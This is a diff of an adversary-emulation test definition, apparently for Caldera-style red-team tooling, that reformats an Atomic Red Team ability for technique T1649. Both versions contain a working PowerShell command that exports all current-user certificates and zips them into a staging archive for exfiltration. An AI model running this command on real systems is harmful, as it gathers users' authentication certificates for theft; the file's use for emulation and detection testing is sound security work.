@@ -1,21 +1,16 @@
-- id: ff26a134-9c8b-57dc-9118-ca9eda469fca
+- requirements: []
   name: Soumaia ART Tests - Staging Local Certificates via Export-Certificate
   description: Export all user certificates and add to a compressed archive.
   tactic: credential-access
-  technique:
-    attack_id: T1649
-    name: Steal or Forge Authentication Certificates
-  platforms:
-    windows:
-      psh:
-        command: |-
-          $archive="$env:PUBLIC\T1649\atomic_certs.zip"
-          $exfilpath="$env:PUBLIC\T1649\certs"
-          Add-Type -assembly "system.io.compression.filesystem"
-          Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore
-          mkdir $exfilpath | Out-Null
-          foreach ($cert in (gci Cert:\CurrentUser\My)) { Export-Certificate -Cert $cert -FilePath $exfilpath\$($cert.FriendlyName).cer}
-          [io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)
-        cleanup: |-
-          $exfilpath="$env:PUBLIC\T1649\certs"
-          Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore
+  technique_id: T1649
+  technique_name: Steal or Forge Authentication Certificates
+  executors:
+  - cleanup:
+    - $exfilpath="$env:PUBLIC\T1649\certs"; Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: $archive="$env:PUBLIC\T1649\atomic_certs.zip"; $exfilpath="$env:PUBLIC\T1649\certs"; Add-Type -assembly "system.io.compression.filesystem"; Remove-Item $(split-path $exfilpath) -Recurse -Force -ErrorAction Ignore; mkdir $exfilpath | Out-Null; foreach ($cert in (gci Cert:\CurrentUser\My)) { Export-Certificate -Cert $cert -FilePath $exfilpath\$($cert.FriendlyName).cer}; [io.compression.zipfile]::CreateFromDirectory($exfilpath, $archive)
+  id: ff26a134-9c8b-57dc-9118-ca9eda469fca
